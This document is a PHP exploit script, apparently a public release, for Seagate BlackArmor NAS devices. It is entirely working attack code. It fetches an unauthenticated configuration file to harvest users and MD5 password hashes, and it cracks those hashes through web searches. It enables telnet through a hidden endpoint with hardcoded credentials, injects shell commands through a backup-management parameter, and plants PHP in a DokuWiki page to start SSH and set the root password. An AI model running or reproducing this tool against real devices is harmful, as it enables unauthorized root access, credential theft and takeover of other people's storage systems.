<?php

 

########################################################################

##     Seagate Black Armor Exploit by J. Diel <jeroen@nerdbox.it>     ##

########################################################################

## Public Release v0.2

########################################################################

 

abstract class MD5Decryptor {

    abstract public function probe($hash);

 

    public static function plain($hash, $class = NULL)

    {

        if ($class === NULL) {

            $class = get_called_class();

        } else {

            $class = sprintf("MD5Decryptor%s", $class);

        }

        $decryptor = new $class();

 

        if (count($hash) > 1) {

            foreach ($hash as &$one) {

                $one = $decryptor->probe($one);

            }

        } else {

            $hash = $decryptor->probe($hash);

        }

        return $hash;

    }

 

    public function dictionaryAttack($hash, array $wordlist)

    {

        $hash = strtolower($hash);

        foreach ($wordlist as $word) {

            if (md5($word) === $hash)

                return $word;

        }

    }

}

 

abstract class MD5DecryptorWeb extends MD5Decryptor {

    protected $url;

 

    public function getWordlist($hash)

    {

        $list = FALSE;

        $url = sprintf($this->url, $hash);

        if ($response = file_get_contents($url)) {

            $list[$response] = 1;

            $list += array_flip(preg_split("/\s+/", $response));

            $list += array_flip(preg_split("/(?:\s|\.)+/", $response));

            $list = array_keys($list);

        }

        return $list;

    }

    public function probe($hash) {

        $hash = strtolower($hash);

        return $this->dictionaryAttack($hash, $this->getWordlist($hash));

    }

}

 

class MD5DecryptorGoogle extends MD5DecryptorWeb {

    protected $url = "http://www.google.com/search?q=%s";

}

 

function portcheck($host, $port) {

  $connection = @fsockopen($host, $port);

 

  if (is_resource($connection)) {

    $port_status = "reachable";

    fclose($connection);

  } else {

      $port_status = "unreachable";

  }

  return $port_status;

}

 

function authenticate($url, $username, $password) {

  $ch = curl_init();

 

  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);

  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);

  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);

  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

 

  curl_setopt($ch, CURLOPT_HEADER, 1);

  curl_setopt($ch, CURLOPT_POST, true);

  curl_setopt($ch, CURLOPT_POSTFIELDS, "p_user=" . $username . "&p_pass=" .
$password);

  curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");

  curl_setopt($ch, CURLOPT_URL, $url);

 

  curl_exec($ch);

  curl_close($ch);

}

 

function RemoteCodeExec($url, $command) {

     $url = $url . "/backupmgt/getAlias.php?ip=" . urlencode("xx
/etc/passwd; ") . urlencode($command) . ";";

     $handle = fopen($url, "r");

}

 

function RemoteFileExist($url) {

     $ch = curl_init($url);

 

     curl_setopt($ch, CURLOPT_NOBODY, true);

     curl_exec($ch);

 

     $retcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

     return $retcode;

     curl_close($ch);

}

 

function getWikiSecurityToken($url) {

  $curl = curl_init($url);

  curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);

  curl_setopt($curl, CURLOPT_AUTOREFERER, TRUE);

  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, TRUE);

  curl_setopt($curl, CURLOPT_COOKIEFILE, "cookie.txt");

 

  $html = curl_exec($curl);

 

  $doc = new DOMDocument;

  @$doc->loadHTML($html);

  $tags = $doc->getElementsByTagName('input');

 

  foreach ($tags as $tag) {

      $search = $tag->getAttribute('value');

      if (strlen($search) == "32") {

           return $search;

           exit;

      }

   }

}

 

$version = "0.2";

 

if (!isset($argv[1])) {

 

echo "------------------------------------------------------------------\n";

echo "  Seagate BlackArmor NAS Exploit v" . $version . " (c) 2013 - " .
date('Y') . " by J. Diel \n";

echo "  IT Nerdbox :: http://www.nerdbox.it :: jeroen@nerdbox.it\n";

echo "------------------------------------------------------------------\n";

echo "\nUsage: php " . $argv[0] . " <url>\n\n";

echo "Example Usage: php " . $argv[0] . " http://<targetip | host>\n";

die();

}

 

$curl = curl_init();

$url = $argv[1] . "/admin/config.xml";

 

curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);

curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);

curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($curl, CURLOPT_URL, $url);

 

$xmldata = curl_exec($curl);

$http_status = curl_getinfo($curl, CURLINFO_HTTP_CODE);

curl_close($curl);

 

if ($http_status == "0") {

                echo "[Error]: The host was not found!\n\n";

                die();

}

 

if ($http_status == "404") {

                echo "[Error]: The page was not found! Are you sure this is
a Seagate BlackArmor NAS?\n";

                die();

}

 

$xml = new SimpleXMLElement($xmldata);

 

$internal_ip = $xml->xpath("network/lan/ip");

$internal_sn = $xml->xpath("network/lan/netmask");

$internal_gw = $xml->xpath("network/lan/gateway");

$dns0 = $xml->xpath("network/lan/dns0");

$dns1 = $xml->xpath("network/lan/dns1");

 

echo "------------------------------------------------------------------\n";

echo "- Network Details: \n";

echo "------------------------------------------------------------------\n";

 

echo "- IP Address         : " . $internal_ip[0] . "/" . $internal_sn[0] .
"\n";

echo "- Gateway / Router   : " . $internal_gw[0] . "/" . $internal_sn[0] .
"\n";

echo "- 1st DNS Server     : " . $dns0[0] . "\n";

echo "- 2nd DNS Server     : " . $dns1[0] . "\n\n";

 

 

$serv_pnp = $xml->xpath("network/service/upnp/enable");

$serv_ftp = $xml->xpath("network/service/ftp/enable");

$serv_ftp_port = $xml->xpath("network/service/ftp/fport");

$serv_nfs = $xml->xpath("network/service/nfs/enable");

 

echo "------------------------------------------------------------------\n";

echo "- Network Services: \n";

echo "------------------------------------------------------------------\n";

$host = explode("/", $argv[1]);

$host = $host[2];

 

echo "- uPNP               : " . $serv_pnp[0] . "\n";

echo "- FTP                : " . $serv_ftp[0] . " (port: " .
$serv_ftp_port[0] . " - " . portcheck("$host", "$serv_ftp_port[0]") . ")\n";

echo "- NFS                : " . $serv_nfs[0] . "\n\n";

 

$shares = $xml->xpath("shares/nasshare/sharename");

$cnt = count($shares);

 

echo "------------------------------------------------------------------\n";

echo "- Network Shares: " . $cnt . "\n";

echo "------------------------------------------------------------------\n";

 

for ($i=0; $i<$cnt; $i++) {

  echo "- " . $shares[$i] . "\n";

}

echo "\n";

 

$username = $xml->xpath("access/users/nasuser/username");

 

while(list( , $node) = each ($username)) {

  $users[] = $node;

}

 

$md5hash = $xml->xpath("access/users/nasuser/htusers");

 

while(list( , $node) = each ($md5hash)) {

 $md5s[] = $node;

}

 

$max = count($users);

 

echo "------------------------------------------------------------------\n";

echo "- User hashes found: \n";

echo "------------------------------------------------------------------\n";

 

$pwdcount = 0;

 

for ($i=0; $i<$max; $i++) {

 

  $file = "md5.hash";

  $fh = fopen($file, (file_exists($file)) ? "a" : "w");

  fclose($fh);

 

  $contents = file_get_contents($file);

  $pattern = preg_quote($md5s[$i], "/");

  $pattern = "/^.*$pattern.*\$/m";

 

  if (preg_match_all($pattern, $contents, $matches)){

     $pwdcount++;

 

     if ($users[$i] != "admin") {

     } else {

                $admin_found = "1";

        $admin_password = explode(":", implode("\n", $matches[0]));

     }

     echo "- " . implode("\n", $matches[0]) . " (username: " . $users[$i] .
")\n";

     $next_user = $users[$i];

     $next_pass = explode(":", implode("\n", $matches[0]));

 

  } else {

      $hashes[] = array("$md5s[$i]", "$users[$i]");

      echo "- " . $md5s[$i] . " (username: " . $users[$i] . ")\n";

  }

}

 

if ($pwdcount == 0) {

      echo
"\n------------------------------------------------------------------\n";

      echo "- No passwords could be found in local storage! \n";

      echo
"------------------------------------------------------------------\n";

     echo "- Search for hashes online?  Type 'yes' to continue: ";

 

      $handle = fopen ("php://stdin","r");

      $line = fgets($handle);

 

      if(trim($line) == "yes"){

                $decryptors = array("Google");

 

        echo
"\n------------------------------------------------------------------\n";

        echo "- Searching online for passwords: \n";

        echo
"------------------------------------------------------------------\n";

                foreach ($hashes as $hash) {

                                echo "- " . $hash[0];

                                foreach($decryptors as $decrytor) {

                                if (NULL !== ($plain =
MD5Decryptor::plain($hash[0], $decrytor))) {

                                                echo " - found: $plain";

                                                                $pwdcount++;

 

                                                                $next_user =
$hash[1];

                                                                $next_pass =
$plain;

 

                                                                if
($next_user == "admin") {

 
$admin_found = "1";

 
$admin_pass = $plain;

                                                                }

 

                                                                $fh =
fopen($file, (file_exists($file)) ? "a" : "w");

                                                                fwrite($fh,
$hash[0] . ":" . $plain . "\n");

                                                                fclose($fh);

                                                break;

                                } else {

                                                    echo " - not found!";

                                                 }

                                }

                                echo "\n";

                }

 

      }

}

 

if ($pwdcount != 0) {

  echo "\nTotal number of passwords found: " . $pwdcount . "\n\n";

  echo
"------------------------------------------------------------------\n";

  echo "- Services: \n";

  echo
"------------------------------------------------------------------\n";

 

  if (isset($admin_found)) {

                $telnet_user = "admin";

                if (isset($admin_password[1])) {

                                $telnet_pass = $admin_password[1];

                } else {

                                $telnet_pass = $admin_pass;

                }

  } else {

                $telnet_user = $next_user;

                $telnet_pass = $next_pass[1];

  }

 

  $telnet_status = portcheck("$host", "23");

 

  if ($telnet_status == "reachable") {

                echo "- The telnet daemon is already running: [skipped]\n";

  } else {

 

      echo "- Enable the telnet daemon? Type 'yes' to continue: ";

 

      $handle = fopen ("php://stdin","r");

      $line = fgets($handle);

 

      if(trim($line) != "yes"){

      } else {

          echo "- Trying to start the telnet daemon   : ";

 

          $url = $argv[1];

 

          authenticate($url, $telnet_user, $telnet_pass);

 

          $ch = curl_init();

          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);

          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);

          curl_setopt($ch, CURLOPT_POST, false);

          curl_setopt($ch, CURLOPT_HTTPHEADER,

                array(

                  "Authorization: Basic SmVXYWI6c3lzYWRtaW4="

          ));

          curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);

          curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");

          curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");

          curl_setopt($ch, CURLOPT_URL, $url .
"/admin/sxmJEWAB/SXMjewab.php?telnet=jewab&debug=1");

          curl_setopt($ch, CURLOPT_TIMEOUT, 5);

          curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,5);

          curl_exec($ch);

          curl_close($ch);

 

          echo "[done]\n";

          echo "- Verifiying telnet daemon status     : ";

 

          $telnet_status = portcheck("$host", "23");

          if ($telnet_status == "reachable") {

                    echo "[verified]\n";

          } else {

                      echo "[error]\n";

                      echo "- This is possible if portforwarding is not
enabled for telnet\n";

          }

       }

  }

 

  $xml = new SimpleXMLElement($xmldata);

  $wiki = $xml->xpath("enableddokuwikiserver");

  $wiki = $wiki[0];

 

  if ($wiki == "yes") {

        echo "- The Wiki server is enabled          : [skipped]\n";

  } else {

        echo "- Enabeling the Wiki server           : ";

 

        $url = $argv[1];

       $ch = curl_init();

 

        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);

        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);

        curl_setopt($ch, CURLOPT_POST, true);

        curl_setopt($ch, CURLOPT_POSTFIELDS,
'enablewiki=yes&agree=yes&btn=Submit');

        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);

        curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');

        curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");

        curl_setopt($ch, CURLOPT_URL, $url . '/admin/dokuwiki_service.php');

 

        curl_exec($ch);

        curl_close($ch);

 

        echo "[done]\n";

  }

 

  echo "- Retrieving wiki security token      : ";

  $sectok = getWikiSecurityToken($argv[1] .
"/wiwiki/doku.php?do=login&id=start");

 

  if (isset($sectok)) {

    echo "[found]\n";

  } else {

     echo "[Not Found]\n";

     exit;

  }

 

  if (isset($admin_found)) {

                echo "- Logging in to the wiki server       : ";

        $url = $argv[1];

        $ch = curl_init();

 

        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);

        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);

        curl_setopt($ch, CURLOPT_POST, true);

        curl_setopt($ch, CURLOPT_POSTFIELDS, "u=" . $telnet_user . "&p=" .
$telnet_pass . "�ok=" . $sectok ."&do=login&id=start");

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

                curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);

                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);

 

        curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");

        curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");

       curl_setopt($ch, CURLOPT_URL, $url . "/wiwiki/doku.php");

 

        curl_exec($ch);

                $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        curl_close($ch);

 

                echo "[done]\n";

 

        echo "- Enabling PHP in wiki server         : ";

                $sectok = getWikiSecurityToken($url .
"/wiwiki/doku.php?id=start&do=admin&page=config");

 

        $ch = curl_init();

 

        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);

        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);

        curl_setopt($ch, CURLOPT_POST, true);

        curl_setopt($ch, CURLOPT_POSTFIELDS, "config[phpok]=1�ok=" .
$sectok . "&do=admin&page=config&save=1&submit=Save");

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

        curl_setopt($ch, CURLOPT_AUTOREFERER, 1);

        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);

 

        curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");

        curl_setopt($ch, CURLOPT_URL, $url . "/wiwiki/doku.php?id=start");

 

        curl_exec($ch);

        curl_close($ch);

 

        echo "[done]\n";

                echo
"\n------------------------------------------------------------------\n";

                echo "- Rooting the NAS: \n";

        echo
"------------------------------------------------------------------\n";

        echo "- Enter the new root password: ";

 

        $handle = fopen ("php://stdin","r");

        $line = fgets($handle);

 

        if(trim($line) == ""){

                  $root_password = "mypassword";

                  echo "- No root password chosen! Setting our own: '" .
$root_password . "'\n";

        } else {

                   $root_password = preg_replace( "/\r|\n/", "", $line);

        }

 

        $ch = curl_init();

 

        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);

        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);

        curl_setopt($ch, CURLOPT_POST, true);

        curl_setopt($ch, CURLOPT_POSTFIELDS, "sectok=" . $sectok .
"&id=playground:playground&do[save]=Save&wikitext=<php>exec(\"/usr/sbin/drop
bear start;\"); exec(\"echo '" . $root_password . "' | passwd
--stdin;\");</php>");

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

        curl_setopt($ch, CURLOPT_AUTOREFERER, 1);

        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);

 

        curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");

        curl_setopt($ch, CURLOPT_URL, $url . "/wiwiki/doku.php");

        curl_exec($ch);

        curl_close($ch);

 

                echo "- The devices is rooted! The password is: " .
$root_password ."\n";

                echo "- The SSH daemon was also enabled!!\n\n";

 

  } else {

                echo "- Can't root the device due to lack of admin
credentials\n";

 

        echo "- However, do you want to reset the admin password? [yes]:"; 

        $handle = fopen ("php://stdin","r");

        $line = fgets($handle);

 

        if(trim($line) == "yes") {

 

        $httpResponseCode = RemoteFileExist($argv[1] .
"/backupmgt/immediate_log/instance.log");

 

                if ($httpResponseCode == "200") {

                        RemoteCodeExec($argv[1], "sed '11,16d'
/proto/SxM_webui/d41d8cd98f00b204e9800998ecf8427e.php >
/proto/SxM_webui/reset.php");

                        RemoteCodeExec($argv[1], "chmod 755
/proto/SxM_webui/reset.php");

 

                        echo "- Now go to: " . $argv[1] . "/reset.php to
reset the default credentials to admin/admin.\n";

                        exit;

                } else {

                        echo "Something went wrong, the HTTP error code is:
" . $httpResponseCode . "\n"; 

                }

        } else {

                echo "Exit....\n";

                exit; 

        }

  }

 

} else {

                echo "- No passwords were found!\n";

 

        echo "- However, do you want to reset the admin password? [yes]:"; 

        $handle = fopen ("php://stdin","r");

        $line = fgets($handle);

 

        if(trim($line) == "yes") {

 

                $httpResponseCode = RemoteFileExist($argv[1] .
"/backupmgt/immediate_log/instance.log");

 

                                if ($httpResponseCode == "200") {

                                                RemoteCodeExec($argv[1],
"sed '11,16d' /proto/SxM_webui/d41d8cd98f00b204e9800998ecf8427e.php >
/proto/SxM_webui/reset.php");

                                RemoteCodeExec($argv[1], "chmod 755
/proto/SxM_webui/reset.php");

 

                                                echo "- Now go to: " .
$argv[1] . "/reset.php to reset the default credentials to admin/admin.\n";

                                                exit;

                                } else {

                                echo "Something went wrong, the HTTP error
code is: " . $httpResponseCode . "\n"; 

                                }

        } else {

                                echo "Exit....\n";

                                exit; 

                }

}

 

?>